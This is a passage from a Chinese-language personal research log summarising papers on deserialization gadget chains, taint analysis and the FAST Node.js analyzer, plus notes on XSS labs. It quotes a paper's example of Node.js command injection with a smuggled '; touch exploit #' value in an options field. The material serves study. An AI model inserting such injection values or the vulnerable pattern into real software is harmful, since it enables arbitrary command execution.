type="1"><li>J. C. S. Santos, R. A. Jones, C. Ashiogwu, and M. Mirakhorli,“Serialization-aware call graph construction“</li><li>Y. Wei, X. Sun, L. Bo, S. Cao, X. Xia, and B. Li, “A comprehensivestudy on security bug characteristics,”</li><li>J. Dahse, N. Krein, and T. Holz, “Code reuse attacks in PHP:automated POP chain generation,”</li><li>I. Haken, “Automated discovery of deserialization gadget chains,” inProceedings of the Black Hat USA, 2018.</li><li>S. Rasheed and J. Dietrich, “A hybrid analysis to detect javaserialisation vulnerabilities,</li></ol><p>........</p></li></ol><h4 id="论文2-1">论文2</h4><ol type="1"><li>论文：<code>A Composite Discover Method for Gadget Chains in Java Deserialization Vulnerability</code></li></ol><hr /><ol type="1"><li>该方法遵循GadgetInspector的<code>静态分析</code>来获取待验证的gadget链。在这项工作中，仍然使用<code>符号执行</code>来生成调用图。</li><li>这种BFS没有考虑到多个gadget链可能<code>共享节点</code>，这导致只会搜索经过同一节点的多个gadget链中的一个</li><li>提出了一种基于<code>Java序列化协议</code>和<code>反射机制</code>的匹配动态验证机制。</li><li><code>Java Deserialization Scanner</code>[16]可以证实该策略的有效性。它是著名渗透测试工具`<code>Burp Suite</code>的插件。</li><li><code>基于指纹的检测</code>只能检测程序中已知的gadget链的存在，而不能检测程序中未知的gadget链的存在。</li><li>A gadget chain can be abstracted as source-&gt;gadgetcore-&gt;sink.</li><li>我们的<code>静态分析</code>分为以下几个步骤：<ol type="1"><li>获取目标程序的类信息和方法信息。</li><li>通过符号执行生成调用图。</li><li>搜索所有边链。</li></ol></li><li><code>ASM库</code>[18]，一个优秀的Java字节流操作工具。</li><li>使用小工具检查器的<code>符号执行</code>来获得每个方法的调用关系。这些调用关系组成了调用关系图，这个调用关系图被存储为&lt; <code>call，callee array &gt;</code> 的集合</li></ol><h4 id="总结-11">总结</h4><ol type="1"><li><strong>论文1总结</strong>：<ol type="1"><li>这篇文献主要是针对Java反序列化漏洞：<ol type="1"><li>分析了：gadge chain 原理</li><li>通过分析<strong>注入对象</strong>的有害数据从<code>source</code>传播到<code>sink</code>验证这条gadgechain的有效性</li><li>自动化生成注入对象进行fuzzing测试</li></ol></li><li>实验仅粗略查看，总结如下：<ol type="1"><li>实验部分<strong>构成</strong>:<ol type="1"><li>确定实验研究问题（RQ）</li><li>实验实施需要的配置和工具</li><li>评估准则</li><li>实验方法的效率</li><li>与其他方法的全面对比</li></ol></li></ol></li></ol></li><li>理解source-sink这个传播路径对于安全研究非常关键</li><li>扩大了知识面：了解到了更多相关的漏洞工具、研究方法</li><li>没有足够多的论文品读，换个思路可以从<strong>工具源码</strong>、<strong>博客文章</strong>入手</li><li>作者在结论中提到:java反序列化漏洞在工业届造成了严重危害，但是学术界关注不多：<code>Java deserialization vulnerability receives little attention in the academic community despite its severe impact in practice.</code></li></ol><h3 id="section-21">2023-08-15</h3><h4 id="论文-1">论文</h4><ol type="1"><li><a href="https://dl.acm.org/doi/10.1145/3554732">An In-depth Studyof <strong>Java Deserialization Remote-Code Execution</strong> Exploitsand Vulnerabilities.</a>(<strong>CCF-A</strong>:软件工程顶刊：ACMTransactions on Software Engineering and Methodology, Volume 32)</li><li><ahref="https://kns.cnki.net/kcms2/article/abstract?v=3uoqIhG8C475KOm_zrgu4sq25HxUBNNTmIbFx6y0bOQ0cH_CuEtpsBEA1ZchHvbBzXSfH-MI98eDZf0c0EzlXHEueUNCTYsU&amp;uniplatform=NZKPT">基于反向污点分析的反序列化漏洞挖掘技术研究</a></li></ol><h4 id="论文1-5">论文1</h4><h5 id="简介">简介</h5><ol type="1"><li>反序列化漏洞非常关键，因此被OWASP列为web应用程序的<strong>十大安全风险之一</strong></li><li>Java、PHP和.NET等几种主流编程语言中的反序列化漏洞，目前主要研究Java中的反序列化漏洞</li><li>Java<strong>序列化</strong>允许将类实例转换成字节流。因此，Java对象可以通过<strong>网络传输</strong>。<strong>反序列化</strong>包括读取序列化的字节流，以便通过加载它们的字段来重建<strong>原始实例</strong></li><li>当在远程主机上进行反序列化时，可以通过链接称为<strong>gadget的Java代码序列</strong>来控制Java代码的执行流</li><li>与其他漏洞相比-反序列化攻击能够<strong>完全控制</strong>受攻击的系统或让位于<strong>勒索软件攻击</strong></li><li>文中提到的这个工具我用过：<code>Ysosial</code>是一个提供概念验证工具的项目，并提供了34个在众所周知的反序列化攻击中利用的Java有效负载。</li></ol><h5 id="重要概念">重要概念</h5><ol type="1"><li><strong>Gadget和Gadget链</strong>。在本文的上下文中，Gadget是一种使用可由攻击者控制的对象或字段的Java方法。小工具链是攻击者创建的一系列恶意方法(小工具)调用。易受攻击的应用程序的类路径中存在一组小工具是执行反序列化攻击所需的条件之一</li><li><strong>Java反序列化漏洞</strong>：(1)包含此方法的程序接受并反序列化来自攻击者可以控制的源的数据，以及(2)攻击者可以利用此漏洞。在实践中，(2)需要构建小工具链，因此要求所有必要的小工具都位于易受攻击应用程序的类路径中。</li></ol><h5 id="示例">示例</h5><ol type="1"><li>著名的<code>CommonsCollections1反序列化攻击</code></li><li><code>ysoserial</code>工具可以生成针对于Java反序列化漏洞的恶意代码</li></ol><h5 id="本文conclusion">本文conclusion</h5><ol type="1"><li>本文是Java反序列化远程代码执行漏洞和漏洞的深入研究。它探讨了反序列化的危险性，以及它如何使应用程序容易受到远程代码执行等攻击的影响。该研究分析了Java库中存在的攻击工具和Java应用程序中的漏洞。它还提出了防止引入攻击工具的库开发人员的建议，并讨论了一些库的修补时间。此外，该研究分析了104个MitreCVE，这些CVE涉及Java应用程序中的反序列化漏洞，并得出结论，不是所有的补丁都能防止攻击并保护应用程序。</li><li>对于漏洞的修补部分，不做太多关注。而本文也不是关于该漏洞的检测方面的内容。仅仅是对漏洞原理的分析，便能成为该文的一创新点。可见Java反序列化漏洞研究甚少。</li></ol><h4 id="论文2-2">论文2</h4><ol type="1"><li><p>检索的这篇中文论文：主要是改进污点分析在漏洞检测中的不足。常规污点分析是正向的，本文提出反向分析技术改进了遗漏问题和效率问题。</p></li><li><p>PHP反序列化漏洞挖掘流程与Java反序列化漏洞挖掘相似，主要分为四步：</p><ol type="1"><li>使用PHP-Parser工具将PHP源码解析为AST树，并将有用的字节码数据保存进字节码数据库中</li><li>然后寻找可控动态函数调用，如所有函数对象和参数对象都可控的<code>a(b)</code>函数调用</li><li>接着反向分析函数调用链，构造从危险函数到起点函数的反序列化漏洞链</li><li>最后输出所有检出反序列化漏洞链。</li></ol></li><li><p>基于<code>CodeQL</code>等框架的自动化安全分析技术</p></li><li></li></ol><h4 id="总结-12">总结</h4><ol type="1"><li>需要阅读两方面的论文，也可以说是研究的思路：<ol type="1"><li>针对各种漏洞的静态分析框架相关论文：改进静态分析技术本身的缺点（例如检测效率与检测速度之间的平恒问题）</li><li>研究反序列化，深入了解反序列化漏洞的特点，针对该特点，去设计相应的检测框架（一种新的检测方法）</li></ol></li></ol><h3 id="section-22">2023-07-29</h3><h4 id="学习内容">学习内容</h4><ul><li><ahref="https://jf710001011.github.io/2023/06/08/static-program-analysis/#toc-heading-58">结束静态分析</a></li><li><ahref="https://jf710001011.github.io/2023/07/12/101-ctf/#toc-heading-6">paddingoracle漏洞原理</a></li><li><ahref="https://jf710001011.github.io/2023/03/06/portswigger/#toc-heading-37">认证漏洞原理</a></li></ul><h4 id="总结-13">总结</h4><h5 id="静态分析">静态分析：</h5><ul><li><p>学习了<strong>数据流分析</strong></p><ul><li><p>变量可达分析</p></li><li><p>变量存活分析</p></li><li><p>表达式可用分析</p></li><li><p>常量传播</p></li></ul></li><li><p>学习了程序<strong>理论</strong></p><ul><li>主要是格（lattice）理论</li></ul></li><li><p>学习了<strong>过程间</strong>分析</p><ul><li>CHA</li><li>控制流图</li><li>数据流分析</li></ul></li><li><p>学习了<strong>指针分析</strong>：在面向对象程序中的作用尤为明显，体现在</p><ul><li><strong>方法调用</strong></li></ul></li><li><p>指针分析中的<strong>上下文敏感</strong>分析</p></li><li><p>静态分析如何应用<strong>安全研究</strong></p><ul><li>指针分析和<strong>污点分析</strong>结合</li></ul></li><li><p>Datalog-Based程序分析：<strong>声明式语言</strong>在静态分析设计算法有很多优点</p></li><li><p>在整个学习过程中：<strong>体会</strong>到了一个完整的解决问题的过程</p><ol type="1"><li>针对问题</li><li>设计符号和新的定义</li><li>设计规则</li><li>算法实现上述内容</li></ol></li><li><p>积累的算法对我后续的研究奠定了一个<strong>基础</strong></p></li></ul><h5 id="下一个目标">下一个目标</h5><ul><li>回到论文</li><li>目前打算着手Java中的反序列化漏洞，原因：<ul><li>指针分析利于分析面向对象语言</li><li>此漏洞特点：对象之间方法调用复杂</li><li>构建相关的对象图、方法调用图、污点分析适合检测此种类型漏洞</li></ul></li></ul><h3 id="section-23">2023-07-22</h3><ul><li><ahref="https://jf710001011.github.io/2023/06/08/static-program-analysis/#toc-heading-38">静态分析：课程08（PointerAnalysis） &amp; Pointer Analysis Foundations (I)</a></li><li><ahref="https://jf710001011.github.io/2023/03/06/portswigger/#toc-heading-43">漏洞：Cross-sitescripting(XSS)</a></li><li>感觉还要一周才能结束剩下的<strong>指针分析</strong>部分：<imgsrc="https://s2.loli.net/2023/07/22/PUSbpEzxl1sy8MN.png"alt="image-20230722173813445" /></li></ul><h3 id="section-24">2023-07-15</h3><ul><li><ahref="https://jf710001011.github.io/2023/06/08/static-program-analysis/#toc-heading-33">静态分析：foundation2&amp; Call Graph Construction (CHA)</a></li><li><ahref="https://jf710001011.github.io/2023/03/06/portswigger/#toc-heading-2">漏洞：sqlinjection</a></li></ul><h3 id="section-25">2023-07-08</h3><ul><li><ahref="https://jf710001011.github.io/2023/06/08/static-program-analysis/#toc-heading-21">静态分析-DataFlow Analysis - Foundations I</a></li><li><ahref="https://jf710001011.github.io/2023/03/06/portswigger/#toc-heading-33">漏洞分析-结束Java反序列化漏洞</a></li></ul><h5 id="总结-14">总结</h5><ul><li>这周的静态分析<strong>理论性</strong>很强，很多新概念，找到我在读论文时候的那个感觉了，论文正是以这种形式对漏洞检测建模</li><li><strong>反序列化漏洞</strong>由于本身的漏洞特性，非常符合我研究的静态分析技术特点，即需要分析源码。<ul><li>果然我之前提到的<strong>advancetopic</strong>上的漏洞都很有研究价值<imgsrc="https://s2.loli.net/2023/07/08/s2C6cobMyN5wS3p.png"alt="image-20230708203433921" /></li></ul></li><li>目前来说我所做的工作：并行学习静态分析和更多的前沿漏洞是<strong>正确的思路</strong>。<ul><li>就差对静态分析的掌握与灵活应用了</li></ul></li><li><strong>下周</strong>：检索静态分析反序列化漏洞相关论文。</li></ul><h3 id="section-26">2023-07-01</h3><ul><li><ahref="https://jf710001011.github.io/2023/06/08/static-program-analysis/#toc-heading-15">学习了静态分析-数据流分析</a></li></ul><h4 id="总结-15">总结</h4><ul><li>数据流分析主要涉及程序的变量和表达式</li></ul><h3 id="section-27">2023-06-24</h3><ul><li><ahref="https://jf710001011.github.io/2023/06/08/static-program-analysis/#toc-heading-5">学习了静态分析-中间表示</a></li><li><ahref="https://jf710001011.github.io/2023/03/06/portswigger/#toc-heading-27">学习了反序列化漏洞</a></li></ul><h4 id="总结-16">总结</h4><ul><li>静态分析以及前沿漏洞的学习将持续一段时间，争取一个月内结束</li></ul><h3 id="section-28">2023-06-09</h3><ul><li><ahref="https://dblp.uni-trier.de/search?q=Static%20Analysis%20%20Vulnerabilities">静态分析&amp;漏洞论文检索</a></li></ul><h4 id="论文信息-1">论文信息</h4><ul><li><ahref="https://www.usenix.org/conference/14th-usenix-security-symposium/finding-security-vulnerabilities-java-applications-static">FindingSecurity Vulnerabilities in Java Applications with Static Analysis</a><strong>CCF-A:</strong>USENIX Security Symposium 2005</li></ul><h4 id="正文-7">正文</h4><ul><li><p>字节码（Bytecode）是一种中间代码形式，它是在程序源代码经过编译但尚未被执行时生成的。字节码通常与特定的虚拟机（如Java虚拟机）相关联，它们是一种可被虚拟机解释或即时编译执行的指令集。字节码的好处之一是它具有跨平台的特性，因为不同的虚拟机可以解释执行相同的字节码。</p><p>在Java中，源代码首先经过编译器编译成字节码文件（以.class为扩展名），然后由Java虚拟机加载和执行这些字节码文件。字节码是一种中间形式，它包含了程序的指令、常量池、字段、方法等信息。通过解释或即时编译，Java虚拟机将字节码转换为机器码，并执行相应的操作。</p></li><li><p>污点对象传播问题：论文定义了源（source）、汇（sink）和派生（derivation）描述符来表示安全漏洞的特征。源描述符表示潜在的污点数据来源，汇描述符表示敏感操作的目标，派生描述符表示对象之间的传播关系。</p></li><li><p>指针分析：指针分析是静态分析中的关键问题，用于确定程序变量在程序执行期间可能指向的堆对象。论文介绍了基于二叉决策图（BDD）的上下文敏感指针分析算法，该算法在保持精确性的同时实现了可扩展性</p></li><li><p>静态安全违规检测：论文提出了使用PQL（Program QueryLanguage）来描述安全漏洞模式的方法。PQL是一种程序查询语言，通过声明变量、定义匹配模式和指定返回结果，可以方便地表达与程序执行相关的动态事件序列。</p></li></ul><h4 id="总结-17">总结</h4><h5 id="论文总结">论文总结</h5><p>作者的方法基于可扩展且精确的指针分析。指针分析是一种确定从给定对象可以访问到的对象集合的技术。这些信息可以用于发现安全漏洞，如SQL注入和跨站脚本攻击。</p><p>作者的方法使用上下文敏感的指针分析。这意味着分析考虑了变量的使用上下文。例如，如果一个变量在已知包含用户输入的上下文中使用，那么分析将考虑从该变量可以访问到的所有对象，即使这些对象不是直接从该变量可达的。</p><p>作者还使用了一种称为改进对象命名的技术。这种技术通过给对象赋予更有意义的名称来减少误报数量。例如，如果一个对象用于存储用户输入，那么该对象将被赋予反映这一事实的名称。这有助于分析区分可能包含用户输入的对象和不包含用户输入的对象</p><h3 id="section-29">2023-06-02</h3><h4 id="论文-2">论文</h4><h5 id="开篇">开篇</h5><ul><li><p><strong>论文信息</strong></p><p><ahref="https://www.computer.org/csdl/proceedings-article/sp/2023/933600b059/1NrbYrQrQ2I">ScalingJavaScript Abstract Interpretation to Detect and Exploit Node.jsTaint-style Vulnerability</a>: <strong>CCF-A</strong>会议：IEEE S&amp;P2023</p></li><li><p><strong>keywords</strong></p></li></ul><h5 id="正文-8">正文</h5><ul><li><p>源点和汇点是软件程序中与数据流相关的概念。</p><p><code>源点</code>（source）是指程序中产生数据流的起点或来源。它可以是用户输入、传感器数据、文件读取等。源点提供了数据流的初始值或输入，它是数据流的生成者。</p><p><code>汇点</code>（sink）是指程序中接收数据流的终点或目标。它可以是数据库写入、网络传输、文件输出等。汇点接收和处理数据流，并对其进行操作或存储，它是数据流的消费者。</p><p>数据流从源点开始，通过程序的不同部分传递，最终到达汇点。在安全领域，源点和汇点之间的数据流可能存在安全风险。例如，源点可能包含恶意输入，汇点可能存在安全漏洞，导致恶意输入被利用或导致安全问题。</p></li><li><p><strong>现存问题</strong></p><ol type="1"><li>准确性和可扩展性的权衡之</li><li>现有的JavaScript静态分析面临的另一个主要挑战是异步函数调用，特别是涉及Promise的函数调用。</li></ol></li><li><p>描述了一个新的系统，称为<code>FAST</code>（可扩展性快速抽象解释）：FAST在这一步的<strong>创新之处</strong>在于采用函数作用域而不是调用序列（与之前的工作相比）进行抽象解释。这使得FAST能够高效地分析一个函数，而不是每次函数调用都要重复分析。此外，为了捕捉JavaScript函数调用解析的复杂性，FAST构建了一种新颖的函数依赖图（<code>FDG</code>），描述了函数如何创建、解析或触发其他函数的执行。</p><ul><li><code>自顶向下</code>的抽象解释修剪了程序，并只分析与可能的污点式汇点具有控制和数据依赖关系的语句<ul><li>符号约束</li></ul></li></ul></li><li><p><strong>Contributions</strong></p><ul><li>提出了一种两阶段的抽象解释方法，第一阶段生成控制流图，以指导第二阶段的高效分析。</li><li>实现了一个名为FAST的原型开源静态工具，用于检测污点式漏洞。</li><li>评估结果显示，FAST在减少误报的方面显著优于最先进的漏洞检测工具。</li></ul></li><li><p>代码分析</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token number">1</span> <span class="token comment">// util.js</span><span class="token number">2</span> <span class="token keyword">const</span> childProcess <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">3</span> <span class="token keyword">const</span> logger <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./logger"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">4</span> <span class="token keyword">function</span> <span class="token function">promisify</span><span class="token punctuation">(</span><span class="token parameter">fn</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>5return <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>6return <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">executor</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span>reject</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token function">fn</span><span class="token punctuation">(</span>arg<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token function">cb</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">8</span><span class="token function">if</span> <span class="token punctuation">(</span>err <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">reject</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">9</span><span class="token function">resolve</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">11</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">12</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token number">13</span> <span class="token punctuation">&#125;</span><span class="token number">14</span> <span class="token keyword">function</span> <span class="token function">execProcess</span><span class="token punctuation">(</span><span class="token parameter">method</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>15return <span class="token function">promisify</span><span class="token punctuation">(</span>childProcess<span class="token punctuation">[</span>method<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">16</span> <span class="token punctuation">&#125;</span><span class="token number">17</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">deflate</span><span class="token punctuation">(</span><span class="token parameter">options</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>18const <span class="token function-variable function">flush_pending</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">strm</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>19const s <span class="token operator">=</span> strm<span class="token punctuation">.</span>state<span class="token punctuation">;</span><span class="token number">20</span><span class="token comment">// let f(n) = 2*nˆ2,</span><span class="token punctuation">,</span>→after k iterations<span class="token punctuation">,</span> there are <span class="token function">fˆk</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> objects21let len <span class="token operator">=</span> s<span class="token punctuation">.</span>pending<span class="token punctuation">;</span><span class="token comment">// n objs</span><span class="token number">22</span><span class="token function">if</span> <span class="token punctuation">(</span>len <span class="token operator">></span> strm<span class="token punctuation">.</span>avail_out<span class="token punctuation">)</span>23len <span class="token operator">=</span> strm<span class="token punctuation">.</span>avail_out<span class="token punctuation">;</span><span class="token comment">// 2*n objs</span>24strm<span class="token punctuation">.</span>avail_out <span class="token operator">-=</span> len<span class="token punctuation">;</span><span class="token comment">// 2*nˆ2 objs</span><span class="token number">25</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token number">26</span><span class="token function">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// ...k*k iterations</span><span class="token number">27</span><span class="token function">while</span> <span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//...k iterations</span><span class="token number">28</span><span class="token function">flush_pending</span><span class="token punctuation">(</span>strm<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ...</span><span class="token number">29</span><span class="token punctuation">&#125;</span><span class="token number">30</span><span class="token punctuation">&#125;</span><span class="token number">31</span> <span class="token punctuation">&#125;</span><span class="token number">32</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">compress</span><span class="token punctuation">(</span><span class="token parameter">options</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">33</span><span class="token function">switch</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>alg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>34case ’zip’<span class="token operator">:</span>35return <span class="token keyword">await</span> <span class="token function">deflate</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>36case ’xz’<span class="token operator">:</span>37var command <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"xz"</span><span class="token punctuation">,</span> <span class="token string">"--stdout"</span><span class="token punctuation">,</span> <span class="token string">"-k"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token number">38</span><span class="token function">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>options<span class="token punctuation">.</span>path<span class="token punctuation">)</span>39command<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>40else41command<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>42command <span class="token operator">=</span> command<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>43logger<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>‘xz<span class="token punctuation">,</span> $<span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span>‘<span class="token punctuation">)</span><span class="token punctuation">;</span>44return <span class="token keyword">await</span> <span class="token function">execProcess</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">)</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">45</span><span class="token punctuation">&#125;</span><span class="token number">46</span> <span class="token punctuation">&#125;</span><span class="token number">47</span> module<span class="token punctuation">.</span><span class="token function-variable function">exports</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">Util</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token number">48</span> module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>compress <span class="token operator">=</span> compress<span class="token punctuation">;</span><span class="token number">49</span> <span class="token comment">// exploit code, under attacker control</span><span class="token number">50</span> <span class="token keyword">const</span> Util <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span>’util<span class="token punctuation">.</span>js’<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">51</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Util</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">compress</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">’alg’</span><span class="token operator">:</span> ’xz’<span class="token punctuation">,</span> <span class="token literal-property property">’path’</span><span class="token operator">:</span> ’<span class="token punctuation">;</span> touch<span class="token punctuation">,</span>→exploit #’ <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>漏洞原理：</strong></p><ol type="1"><li><p>在第51行，通过<code>const Util = require('util.js');</code>导入了<code>util.js</code>模块，并创建了一个<code>Util</code>的实例。</p></li><li><p>在第51行的代码<code>(new Util()).compress(&#123; 'alg': 'xz', 'path': '; touch exploit #' &#125;);</code>中，调用了<code>Util</code>实例的<code>compress</code>方法，并传入了一个包含选项的对象作为参数。其中，<code>alg</code>选项的值为'xz'，<code>path</code>选项的值为';touch exploit #'。</p></li><li><p>在<code>compress</code>方法中，根据<code>options.alg</code>的值进行条件判断。</p></li><li><p>当<code>options.alg</code>的值为'xz'时，执行37-44行的代码块。这段代码构建一个命令，并将其作为字符串拼接到<code>command</code>变量中。如果<code>options.path</code>为空，则拼接的命令为"xz--stdout -k data"；否则，拼接的命令为"xz --stdout-k"加上<code>options.path</code>的值。最后，通过调用<code>execProcess("exec")</code>方法，将命令作为参数传递给<code>childProcess.exec</code>函数进行执行。</p></li><li><p>漏洞出现在拼接命令的过程中。由于未对<code>options.path</code>进行适当的输入验证或过滤，攻击者可以在<code>options.path</code>中注入恶意的操作系统命令。在这个例子中，注入的命令是";touch exploit#"，它会尝试在操作系统中执行<code>touch</code>命令创建一个名为"exploit"的文件。</p></li><li><p>漏洞的利用代码出现在49-51行，攻击者通过传入恶意的<code>options.path</code>，即";touch exploit#"，来触发操作系统命令注入漏洞。当程序执行到这部分代码时，恶意命令将被执行，导致在操作系统中创建了一个名为"exploit"的文件。</p></li></ol><p>因此，这个操作系统命令注入漏洞使得攻击者能够在执行压缩操作时执行任意的操作系统命令，从而对系统造成潜在的安全风险。</p></li><li><p><strong>Vulnerability Detection Challenges</strong></p><ol type="1"><li><p>accuracy-scalability trade-off</p><blockquote><ol type="1"><li>首先，静态地解析fn是具有挑战性的，因为fn在promisify的闭包中被定义为函数参数。其次，childProcess[method]的解析取决于第14行的函数参数method，该参数作为字符串传递给第44行的函数。最后，尽管在第7行注册了回调函数cb，但是异步函数仅在第44行执行，当await等待所有的promise被解决时。事实上，经典的静态分析[4]无法解析fn（第7行）或childProcess[method]（第15行），导致控制流图中缺少调用边缘，从而导致漏报漏洞。</li><li>抽象解释常常面临对象爆炸的问题。也就是说，涉及的对象数量可能呈指数级增加，导致需要大量的存储空间来存储对象，并且需要过多的时间来确定每个对象。</li></ol></blockquote></li><li><p>vulnerability validation</p></li></ol></li><li><p>FAST包含<strong>三个阶段</strong>：</p><ul><li><ol type="i"><li>控制流路径生成阶段，使用自底向上的抽象解释来构建控制流图，并找到从入口点到汇函数的路径；</li></ol></li><li><ol start="2" type="i"><li>数据流路径生成阶段，使用自顶向下的抽象解释来根据第一阶段中的控制流路径生成准确和有信息量的数据流路径</li></ol></li><li><ol start="3" type="i"><li>漏洞利用生成阶段，将数据流路径转换为约束，并解决这些约束以生成漏洞利用代码。</li></ol></li></ul></li><li><p><strong>可扩展性</strong>是指系统能够有效地处理大规模代码和复杂性的能力。在软件漏洞检测中，可扩展性是一项重要的挑战，因为现实世界中的代码规模庞大且复杂</p></li><li><p>提取控制流和数据流约束以供<code>约束求解器</code>使用</p></li></ul><h4 id="总结-18">总结</h4><ul><li><p><strong>论文总结</strong>：</p><p>本文是一篇关于使用<strong>FAST</strong>（一种用于检测和利用Node.js污点风格漏洞的两阶段抽象解释方法）的论文。文章介绍了FAST的<strong>两个阶段</strong>：bottom-upabstract interpretation和top-down abstractinterpretation，并详细描述了它们如何优化抽象解释过程以提高分析效率。文章还讨论了现有方法在检测taint-style漏洞时存在的问题，以及JavaScript语言中静态分析<strong>可扩展性和准确性之间的固有权衡</strong>。最后，作者通过实验验证了FAST在检测Node.js应用程序中污点风格漏洞方面的有效性和可扩展性。</p></li><li><p>本文还将作者之前提出的框架<code>ODGen</code>（见之前原型污染相关文章）进行了对比，可以说本文是对之前自己所做研究成果的进一步完善</p></li></ul><hr /><h4 id="补充">补充：</h4><ul><li>太难，留着以后回看</li></ul><h3 id="section-30">2023-05-19</h3><h4 id="学习笔记和漏洞研究记录">学习笔记和漏洞研究记录</h4><ul><li><p><ahref="https://jf710001011.github.io/2023/05/02/javascript/">web &amp;js</a></p><p>其中<strong>重点内容</strong>是：</p><ul><li>表单的提交：这可能涉及用户提交的个人信息（如账号密码），此处是漏洞研究的主要目标。</li><li>Js程序在用户与浏览器交互 和浏览器与服务器交互中扮演的重要作用。</li></ul></li><li><p><strong><ahref="https://jf710001011.github.io/2023/03/06/portswigger/">漏洞研究</a></strong>：</p><p>当涉及到<code>AngularJS</code>时，XSS漏洞可能会在没有HTML的情况下发生，这是PortSwigger研究团队在其文章《<code>XSS without HTML: Client-Side Template Injection with AngularJS</code>》中提到的主题。<strong>总结</strong>如下：</p><ul><li>AngularJS是一种流行的JavaScript框架，用于创建单页应用程序。</li><li>AngularJS模板用于在客户端渲染HTML内容。</li><li>AngularJS模板可能会被注入恶意代码，从而利用XSS漏洞。</li><li>有多种方式可以将恶意代码注入到AngularJS模板中，包括：<ul><li>使用未经过清理的用户输入。</li><li>使用第三方库。</li><li>使用AngularJS指令。</li><li>一旦将恶意代码注入到AngularJS模板中，就可以在受害者的浏览器上执行任意JavaScript代码。<ol type="1"><li>这可以用于窃取Cookie、会话令牌和其他敏感信息。</li><li>还可以用于劫持受害者的浏览器并执行其他恶意操作。</li></ol></li></ul></li><li>文章提供了一些预防AngularJS应用程序中XSS漏洞的建议。这些建议包括：<ul><li>在将用户输入用于AngularJS模板之前对其进行清理。</li><li>仅使用可信任的第三方库。</li><li>在使用AngularJS指令之前仔细审查它们。</li><li>及时更新AngularJS以获取最新的安全补</li></ul></li></ul></li></ul><h4 id="总结-19">总结</h4><ul><li>最近都是以实验、实践的形式在研究发现漏洞的手法：主要是使用<strong>国外安全团队的Lab研究博客</strong>作为学习资料</li><li>学习过程中对其中的<strong>关键应用程序代码</strong>和<strong>注入的恶意代码</strong>进行了细致学习，学习了漏洞原理和发掘漏洞的思路。</li></ul><h3 id="section-31">2023-05-12</h3><h4 